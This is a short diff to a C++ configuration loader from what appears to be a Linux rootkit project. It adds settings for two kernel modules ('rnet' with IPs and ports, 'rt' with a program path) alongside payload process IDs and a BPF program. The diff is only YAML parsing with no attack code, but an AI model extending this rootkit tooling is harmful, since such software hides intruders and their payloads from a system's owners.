@@ -2,6 +2,7 @@
 #include "rootkit/Utils.hpp"
 
 #include <cstdint>
+#include <filesystem>
 #include <optional>
 #include <stdint.h>
 #include <unistd.h>
@@ -23,16 +24,25 @@ ConfigManager::ConfigManager(const std::string& config_path, const pid_t payload
 bool ConfigManager::read() {
     try {
         YAML::Node config = YAML::LoadFile(config_path);
-        // Configure Kernel module
-        kConf.module_path = config["kernel_module_config"]["path"].as<std::string>();
-        kConf.module_name = config["kernel_module_config"]["name"].as<std::string>();
+        // Configure rnet Kernel module
+        rnetConf.module_path = config["rnet"]["path"].as<std::string>();
+        rnetConf.module_name = config["rnet"]["name"].as<std::string>();
 
         // Get all IPs and ports
-        for (const auto& ip_and_port : config["kernel_module_config"]["ips_and_ports"]) {
+        for (const auto& ip_and_port : config["rnet"]["ips_and_ports"]) {
             const std::string ip = ip_and_port["ip"].as<std::string>();
             const uint16_t port = ip_and_port["port"].as<uint16_t>();
-            kConf.ips_and_ports.push_back({ip, port});
+            rnetConf.ips_and_ports.push_back({ip, port});
         }
+
+
+        // Configure rt kernel module
+        rtConf.module_path = config["rt"]["module_path"].as<std::string>();
+        rtConf.module_name = config["rt"]["module_name"].as<std::string>();
+        rtConf.program_path = config["rt"]["program_path"].as<std::string>();
+        // Convert program path to absoule path
+        rtConf.program_path = std::filesystem::absolute(rtConf.program_path);
+        rtConf.program_cwd = utils::get_cwd();
 
         // Configure bpf program
         // If true, get inode of /proc/<self>
@@ -89,9 +99,15 @@ void ConfigManager::add_payload_pid(pid_t pid) {
     }
 }
 
-std::optional<KernelModuleConfig> ConfigManager::get_kernel_module_config() {
+std::optional<RtConfig> ConfigManager::get_rt_config() {
     if (is_config_ready)
-        return kConf;
+        return rtConf;
+    return std::nullopt;
+}
+
+std::optional<RnetConfig> ConfigManager::get_rnet_config() {
+    if (is_config_ready)
+        return rnetConf;
     return std::nullopt;
 }
 
